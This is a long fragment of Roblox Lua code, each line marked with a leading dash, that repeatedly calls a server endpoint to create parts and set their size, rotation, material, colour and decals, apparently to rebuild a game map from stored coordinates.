-			transparency(pt,0)
-			color(pt,Color3.fromRGB(254,243,187))
-			setanchor(pt,true)
-			setname(pt,"Smooth Block Model")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-145.71966552734375,57.29932403564453,-38.623077392578125),workspace)
-			resize(pt,Vector3.new(1.600000023841858,6.500000476837158,1.600000023841858),CFrame.new(-145.71966552734375,57.29932403564453,-38.623077392578125)*CFrame.Angles(math.rad(0),math.rad(0.28200000524520874),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(248,248,248))
-			setanchor(pt,true)
-			setname(pt,"Light")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-157.74029541015625,41.974395751953125,-57.97271728515625),workspace)
-			resize(pt,Vector3.new(2.8498008251190186,2.7499706745147705,2.3998937606811523),CFrame.new(-157.74029541015625,41.974395751953125,-57.97271728515625)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(160,86,36))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-157.74029541015625,43.37438201904297,-57.972442626953125),workspace)
-			resize(pt,Vector3.new(2.799802780151367,0.15000000596046448,2.799894094467163),CFrame.new(-157.74029541015625,43.37438201904297,-57.972442626953125)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(188,155,93))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-146.6822509765625,50.599403381347656,24.844680786132812),workspace)
-			resize(pt,Vector3.new(0.44999998807907104,17.39996337890625,9.899884223937988),CFrame.new(-146.6822509765625,50.599403381347656,24.844680786132812)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(105,102,92))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-145.95187377929688,41.79944610595703,-64.68539428710938),workspace)
-			resize(pt,Vector3.new(3.599998950958252,2.600001335144043,14.900002479553223),CFrame.new(-145.95187377929688,41.79944610595703,-64.68539428710938)*CFrame.Angles(math.rad(0),math.rad(-89.72100067138672),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(53,43,36))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-145.64498901367188,60.624725341796875,-23.324005126953125),workspace)
-			resize(pt,Vector3.new(1.1000374555587769,0.05000000074505806,1.100000023841858),CFrame.new(-145.64498901367188,60.624725341796875,-23.324005126953125)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(180)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(254,243,187))
-			setanchor(pt,true)
-			setname(pt,"Smooth Block Model")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-156.56539916992188,59.87440490722656,-12.632598876953125),workspace)
-			resize(pt,Vector3.new(73.99982452392578,1.549999475479126,1.0499999523162842),CFrame.new(-156.56539916992188,59.87440490722656,-12.632598876953125)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(17,17,17))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-153.45187377929688,42.05065155029297,-64.64913940429688),workspace)
-			resize(pt,Vector3.new(3.7999985218048096,3.100001096725464,0.10000000149011612),CFrame.new(-153.45187377929688,42.05065155029297,-64.64913940429688)*CFrame.Angles(math.rad(0),math.rad(-89.72100067138672),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(204,142,105))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Back)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Back)
-			transparency(pt,0.8999999761581421)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-152.82608032226562,42.13640594482422,-18.712310791015625),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-152.82608032226562,42.13640594482422,-18.712310791015625)*CFrame.Angles(math.rad(0),math.rad(90),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-152.77334594726562,42.13640594482422,-7.9124755859375),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-152.77334594726562,42.13640594482422,-7.9124755859375)*CFrame.Angles(math.rad(0),math.rad(90),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-152.72354125976562,42.13640594482422,2.28741455078125),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-152.72354125976562,42.13640594482422,2.28741455078125)*CFrame.Angles(math.rad(0),math.rad(90),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-145.96090698242188,42.04945373535156,-66.53546142578125),workspace)
-			resize(pt,Vector3.new(0.09999983012676239,3.100001096725464,15.100003242492676),CFrame.new(-145.96090698242188,42.04945373535156,-66.53546142578125)*CFrame.Angles(math.rad(0),math.rad(-89.72100067138672),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(204,142,105))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Left)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Left)
-			transparency(pt,0.8999999761581421)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-145.64471435546875,57.29933166503906,-23.27325439453125),workspace)
-			resize(pt,Vector3.new(1.600000023841858,6.500000476837158,1.600000023841858),CFrame.new(-145.64471435546875,57.29933166503906,-23.27325439453125)*CFrame.Angles(math.rad(0),math.rad(0.28200000524520874),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(248,248,248))
-			setanchor(pt,true)
-			setname(pt,"Light")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-145.56680297851562,60.624725341796875,-7.324188232421875),workspace)
-			resize(pt,Vector3.new(1.1000374555587769,0.05000000074505806,1.100000023841858),CFrame.new(-145.56680297851562,60.624725341796875,-7.324188232421875)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(180)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(254,243,187))
-			setanchor(pt,true)
-			setname(pt,"Smooth Block Model")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-145.5667724609375,57.29933166503906,-7.32342529296875),workspace)
-			resize(pt,Vector3.new(1.600000023841858,6.500000476837158,1.600000023841858),CFrame.new(-145.5667724609375,57.29933166503906,-7.32342529296875)*CFrame.Angles(math.rad(0),math.rad(0.28200000524520874),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(248,248,248))
-			setanchor(pt,true)
-			setname(pt,"Light")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-143.18475341796875,42.40167999267578,-33.8565673828125),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-143.18475341796875,42.40167999267578,-33.8565673828125)*CFrame.Angles(math.rad(0),math.rad(-89.72100067138672),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-145.61203002929688,68.09945678710938,-42.78667449951172),workspace)
-			resize(pt,Vector3.new(27.99998664855957,13.199996948242188,38.200069427490234),CFrame.new(-145.61203002929688,68.09945678710938,-42.78667449951172)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(17,17,17))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-142.13705444335938,50.599403381347656,-58.0533447265625),workspace)
-			resize(pt,Vector3.new(3.0998222827911377,20.199966430664062,30.09990119934082),CFrame.new(-142.13705444335938,50.599403381347656,-58.0533447265625)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(17,17,17))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-143.18142700195312,42.40167999267578,0.623504638671875),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-143.18142700195312,42.40167999267578,0.623504638671875)*CFrame.Angles(math.rad(0),math.rad(-89.72100067138672),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-143.18222045898438,42.40167999267578,-21.0264892578125),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-143.18222045898438,42.40167999267578,-21.0264892578125)*CFrame.Angles(math.rad(0),math.rad(-89.72100067138672),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-133.92901611328125,42.40167999267578,11.240142822265625),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-133.92901611328125,42.40167999267578,11.240142822265625)*CFrame.Angles(math.rad(0),math.rad(-89.72100067138672),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-140.28323364257812,42.40167999267578,-23.9970703125),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-140.28323364257812,42.40167999267578,-23.9970703125)*CFrame.Angles(math.rad(0),math.rad(-179.71800231933594),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-140.28244018554688,42.40167999267578,-2.347076416015625),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-140.28244018554688,42.40167999267578,-2.347076416015625)*CFrame.Angles(math.rad(0),math.rad(-179.71800231933594),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-137.71234130859375,75.89939880371094,-42.82525634765625),workspace)
-			resize(pt,Vector3.new(40,2.4000000953674316,39),CFrame.new(-137.71234130859375,75.89939880371094,-42.82525634765625)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(17,17,17))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-136.15206909179688,42.05065155029297,-64.73361206054688),workspace)
-			resize(pt,Vector3.new(3.7999985218048096,3.100001096725464,0.10000000149011612),CFrame.new(-136.15206909179688,42.05065155029297,-64.73361206054688)*CFrame.Angles(math.rad(0),math.rad(-89.72100067138672),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(204,142,105))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Back)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Back)
-			transparency(pt,0.8999999761581421)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-140.21160888671875,42.40167999267578,-18.175445556640625),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-140.21160888671875,42.40167999267578,-18.175445556640625)*CFrame.Angles(math.rad(0),math.rad(0.28200000524520874),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-140.2108154296875,42.40167999267578,3.474578857421875),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-140.2108154296875,42.40167999267578,3.474578857421875)*CFrame.Angles(math.rad(0),math.rad(0.28200000524520874),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-137.35980224609375,42.40167999267578,0.551849365234375),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-137.35980224609375,42.40167999267578,0.551849365234375)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-137.360595703125,42.40167999267578,-21.09814453125),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-137.360595703125,42.40167999267578,-21.09814453125)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-137.36309814453125,42.40167999267578,-33.92822265625),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-137.36309814453125,42.40167999267578,-33.92822265625)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-137.6302490234375,68.09938049316406,-26.025482177734375),workspace)
-			resize(pt,Vector3.new(5.599987030029297,13.199996948242188,38),CFrame.new(-137.6302490234375,68.09938049316406,-26.025482177734375)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(17,17,17))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Left)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Left)
-			transparency(pt,0.800000011920929)
-			createdecal(pt,Enum.NormalId.Back)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Back)
-			transparency(pt,0.800000011920929)
-			createdecal(pt,Enum.NormalId.Right)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Right)
-			transparency(pt,0.800000011920929)
-			createdecal(pt,Enum.NormalId.Front)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Front)
-			transparency(pt,0.800000011920929)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-134.41567993164062,59.87440490722656,-12.740753173828125),workspace)
-			resize(pt,Vector3.new(73.99982452392578,1.549999475479126,1.0499999523162842),CFrame.new(-134.41567993164062,59.87440490722656,-12.740753173828125)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(17,17,17))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-137.71234130859375,75.89939880371094,-42.82525634765625),workspace)
-			resize(pt,Vector3.new(40.400001525878906,0.30000004172325134,39.400001525878906),CFrame.new(-137.71234130859375,75.89939880371094,-42.82525634765625)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(4,175,236))
-			setanchor(pt,true)
-			setname(pt,"Neon")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-138.45217895507812,42.04823303222656,-64.72238159179688),workspace)
-			resize(pt,Vector3.new(3.7999985218048096,3.100001096725464,0.10000000149011612),CFrame.new(-138.45217895507812,42.04823303222656,-64.72238159179688)*CFrame.Angles(math.rad(0),math.rad(-89.72100067138672),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(204,142,105))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Front)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Front)
-			transparency(pt,0.8999999761581421)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-137.85739135742188,68.69432067871094,-62.295074462890625),workspace)
-			resize(pt,Vector3.new(12.399999618530273,0.05000000074505806,20.399999618530273),CFrame.new(-137.85739135742188,68.69432067871094,-62.295074462890625)*CFrame.Angles(math.rad(0),math.rad(90.28199768066406),math.rad(-90)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(248,248,248))
-			setanchor(pt,true)
-			setcollision(pt,false)
-			setname(pt,"Neon Sign")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-137.85733032226562,68.69477844238281,-62.24517822265625),workspace)
-			resize(pt,Vector3.new(20.39999771118164,0.05000000074505806,12.399998664855957),CFrame.new(-137.85733032226562,68.69477844238281,-62.24517822265625)*CFrame.Angles(math.rad(-90),math.rad(0.2800000011920929),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(99,95,98))
-			setanchor(pt,true)
-			setcollision(pt,false)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Top)
-			setdecal(pt,"321235183",Enum.NormalId.Top)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-137.79339599609375,57.59941101074219,-59.4254150390625),workspace)
-			resize(pt,Vector3.new(5.599987030029297,34.19999694824219,38),CFrame.new(-137.79339599609375,57.59941101074219,-59.4254150390625)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(17,17,17))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Right)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Right)
-			transparency(pt,0.800000011920929)
-			createdecal(pt,Enum.NormalId.Back)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Back)
-			transparency(pt,0.800000011920929)
-			createdecal(pt,Enum.NormalId.Left)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Left)
-			transparency(pt,0.800000011920929)
-			createdecal(pt,Enum.NormalId.Front)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Front)
-			transparency(pt,0.800000011920929)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-137.71234130859375,75.89939880371094,-42.82525634765625),workspace)
-			resize(pt,Vector3.new(40.100006103515625,0.30000004172325134,39.20000457763672),CFrame.new(-137.71234130859375,75.89939880371094,-42.82525634765625)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(99,95,98))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-131.03079223632812,42.40167999267578,-13.280487060546875),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-131.03079223632812,42.40167999267578,-13.280487060546875)*CFrame.Angles(math.rad(0),math.rad(-179.71800231933594),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-131.02999877929688,42.40167999267578,8.26959228515625),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-131.02999877929688,42.40167999267578,8.26959228515625)*CFrame.Angles(math.rad(0),math.rad(-179.71800231933594),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
